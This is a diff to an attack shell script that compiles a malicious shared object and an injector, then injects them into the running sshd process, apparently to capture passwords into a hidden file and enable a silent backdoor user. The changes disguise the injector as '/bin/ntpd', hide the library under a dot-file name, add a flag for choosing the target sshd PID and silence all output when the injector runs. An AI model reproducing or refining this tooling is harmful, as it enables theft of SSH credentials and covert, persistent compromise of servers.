@@ -2,15 +2,19 @@
 inject_s="/tmp/.i.c"
 shellcode_s="/tmp/.i.s"
 got_s="/tmp/.g.c"
-evilSoPath="/tmp/hello.so"
-inject_o="/tmp/.i"
+evilSoPath="/tmp/.g.so"
+inject_o="/bin/ntpd"
 payload="/tmp/.password.txt"
 mode="0"
-sshd_pid=$(ps -ef | grep "sshd" -m 1| grep -v grep | awk '{print $2}')
+sshd_pid=$(ps -ef | grep "sshd"|grep "listener" |grep -v grep | awk '{print $2}')
 slient_mode="0"
 slient_user="anyone"
 libc_string="libc-"
-while getopts ":e:m:o:p:d:l:" opt
+if [! $sshd_pid ]; then 
+    echo "By default, high-precision pid detection fails and low-precision mode is used. The sshd process id may be inaccurate and may need to be specified using s."
+    sshd_pid=$(ps -ef | grep "sshd" -m 1| grep -v grep | awk '{print $2}')
+fi
+while getopts ":e:m:o:p:d:l:s:" opt
 do
     case $opt in
         e)
@@ -31,6 +35,9 @@ do
         ;;
         l)
         libc_string=$OPTARG
+        ;;
+        s)
+        sshd_pid=$OPTARG
         ;;
     esac
 done
@@ -1001,4 +1008,5 @@ sed -i "s#THISISSLIENTUSER#${slient_user}#g" ${got_s}
 gcc -shared ${got_s} -ldl -fPIC -o ${evilSoPath} -std=c99
 gcc ${inject_s}  -g -o ${inject_o} -ldl -lpthread
 rm ${inject_s}  ${got_s}
-nohup ${inject_o} ${sshd_pid} & 
+nohup ${inject_o} ${sshd_pid} >/dev/null 2>&1 &
+
